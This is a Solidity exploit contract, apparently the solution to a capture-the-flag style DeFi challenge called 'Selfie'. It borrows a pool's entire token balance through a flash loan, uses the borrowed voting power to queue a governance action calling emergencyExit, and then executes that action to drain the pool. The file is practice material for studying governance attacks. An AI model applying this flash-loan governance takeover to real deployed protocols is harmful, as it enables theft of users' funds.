// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../src/selfie/SelfiePool.sol";
import "../../src/selfie/SimpleGovernance.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20Votes} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol";


contract ExploitHelper is IERC3156FlashBorrower {
    address public owner;
    SelfiePool public pool;
    SimpleGovernance public governance;
    IERC20 public token;
    uint256 public actionId;
    address recovery;

    constructor(address _recovery, address _pool, address _governance, address _token) {
        owner = msg.sender;
        recovery = _recovery;
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = IERC20(_token);
    }

    function initiateAttack() external {
        require(msg.sender == owner, "Not owner");
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, "");
    }

    // Called during the flashloan
    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external override returns (bytes32) {
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);

        ERC20Votes(address(token)).delegate(address(this));

        actionId = governance.queueAction(address(pool), 0, data);

        token.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function getActionId() external view returns (uint256) {
        return actionId;
    }

    function execute() external {
        governance.executeAction(actionId);
    }
}
